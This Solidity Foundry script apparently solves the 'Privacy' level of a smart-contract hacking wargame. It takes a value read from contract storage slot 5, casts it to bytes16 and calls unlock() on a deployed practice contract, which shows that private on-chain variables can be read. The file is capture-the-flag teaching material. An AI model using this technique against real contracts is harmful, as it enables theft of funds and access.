// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import{Script,console} from "forge-std/Script.sol";
import{Privacy} from "../src/Level12.sol";
contract Level12Solution is Script{

    Privacy privacy=Privacy(0x857a78f176b7C8BB06B8cd5B88759645FD4Dd65D);
    
    function run() external{
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            bytes32 data=0x706a7b978bc35089dd2caf37f1504f1994e8142637dfa24db99f811ddb74d61b; //data in solt 5
            console.log("before hack: is locked",privacy.locked());
            privacy.unlock(bytes16(data));
            console.log("after hack: is locked",privacy.locked());
            vm.stopBroadcast();
    }
}